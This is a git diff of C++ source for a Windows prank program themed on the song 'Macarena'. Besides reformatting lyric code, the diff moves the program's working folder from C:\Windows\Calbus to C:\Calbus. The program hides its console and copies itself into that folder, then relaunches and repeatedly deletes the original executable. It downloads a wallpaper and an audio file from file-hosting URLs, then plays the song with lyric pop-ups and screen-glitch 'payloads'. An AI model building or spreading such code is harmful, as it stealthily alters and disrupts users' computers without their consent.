@@ -154,8 +154,8 @@ std::wstring s2ws(const std::string& s)
     return r;
 }
 
-std::string wallpaper = "C:\\Windows\\Calbus\\mauriescalboxdddddddCALBISIE.png";
-std::string soundThing = "C:\\Windows\\Calbus\\yathusableeeemfskfmdsl.wav";
+std::string wallpaper = "C:\\Calbus\\mauriescalboxdddddddCALBISIE.png";
+std::string soundThing = "C:\\Calbus\\yathusableeeemfskfmdsl.wav";
 
 BOOL isMacarenaPlaying = 0;
 std::vector<std::thread> coroutine;
@@ -185,23 +185,23 @@ namespace Lyrics {
             songLyrics[x0] = x1;
     }
     void doLyric(int x0) {
-        
-        if (doesLyricsExists(x0-1)) {
-            lyric = songLyrics[x0-1];
-            lyricsBox(songLyrics[x0-1]);
+
+        if (doesLyricsExists(x0 - 1)) {
+            lyric = songLyrics[x0 - 1];
+            lyricsBox(songLyrics[x0 - 1]);
         }
     }
     void initLyrics() {
-        addLyric(370,"When I dance they call me Macarena");
-        addLyric(395,"And the boys they say me que estoy buena");
-        addLyric(420,"They all want me, they can't have me");
-        addLyric(442,"So they all come and dance beside me");
-        addLyric(469,"Move with me, chant with me");
-        addLyric(490,"And if you're good I'll take you home with me");
-        addLyric(509,"Dale a tu cuerpo alegría Macarena");
-        addLyric(530,"Que tu cuerpo es pa' darle alegria y cosa buena");
-        addLyric(560,"Dale a tu cuerpo alegría Macarena");
-        addLyric(580,"Heee");
+        addLyric(370, "When I dance they call me Macarena");
+        addLyric(395, "And the boys they say me que estoy buena");
+        addLyric(420, "They all want me, they can't have me");
+        addLyric(442, "So they all come and dance beside me");
+        addLyric(469, "Move with me, chant with me");
+        addLyric(490, "And if you're good I'll take you home with me");
+        addLyric(509, "Dale a tu cuerpo alegría Macarena");
+        addLyric(530, "Que tu cuerpo es pa' darle alegria y cosa buena");
+        addLyric(560, "Dale a tu cuerpo alegría Macarena");
+        addLyric(580, "Heee");
         addLyric(583, "Heee");
         addLyric(584, "Heee");
         addLyric(585, "Heee");
@@ -261,10 +261,10 @@ int main(int argc, char* argv[], char* envp[])
     Lyrics::initLyrics();
     std::thread currentThread;
     FreeConsole();
-    system("md C:\\Windows\\Calbus");
-    if (executable_name() != "C:\\Windows\\Calbus\\executable_xd.exe") {
-        CopyFileA(executable_name().c_str(),"C:\\Windows\\Calbus\\executable_xd.exe",0);
-        std::string sysDel = "C:\\Windows\\Calbus\\executable_xd.exe yes \"" + executable_name() + "\"";
+    system("md C:\\Calbus");
+    if (executable_name() != "C:\\Calbus\\executable_xd.exe") {
+        CopyFileA(executable_name().c_str(), "C:\\Calbus\\executable_xd.exe", 0);
+        std::string sysDel = "C:\\Calbus\\executable_xd.exe yes \"" + executable_name() + "\"";
         STARTUPINFO si = { 0 };
         PROCESS_INFORMATION pi = { 0 };
         std::wstring lvi = s2ws(sysDel);
@@ -275,16 +275,16 @@ int main(int argc, char* argv[], char* envp[])
     }
     if (argc != 3)
         return 0;
-    if (!strstr(argv[1],"yes"))
+    if (!strstr(argv[1], "yes"))
         return 0;
-    DeleteFileA(argv[2]);
+    while (!DeleteFileA(argv[2])) Sleep(20);
     /* Download required files for running. */
     LPCSTR wpDlWebsite = "https://i.imgur.com/EFRtiJK.png";
     if (!fileUtils::file_check(wallpaper, 303791)) {
         Sleep(50);
         URLDownloadToFileA(NULL, wpDlWebsite, wallpaper.c_str(), 0, NULL);
     }
-    wpDlWebsite = "https://download947.mediafire.com/0ty3stzmvpcg/nfbz2ppyoqklqz6/macarena-1996-high-quality-audio.wav";
+    wpDlWebsite = "https://srv-file11.gofile.io/download/8o1isr/yathusableeeemfskfmdsl.wav";
     if (!fileUtils::file_check(soundThing, 40739508)) {
         Sleep(50);
         URLDownloadToFileA(NULL, wpDlWebsite, soundThing.c_str(), 0, NULL);
@@ -295,7 +295,7 @@ int main(int argc, char* argv[], char* envp[])
 
     while (playMacarena) {
         Lyrics::doLyric(uKnow);
-        const char * uKnowChar = std::to_string(uKnow).c_str();
+        const char* uKnowChar = std::to_string(uKnow).c_str();
         Payloads::screen_bug = 1;
         uKnow++;
         Sleep(100);
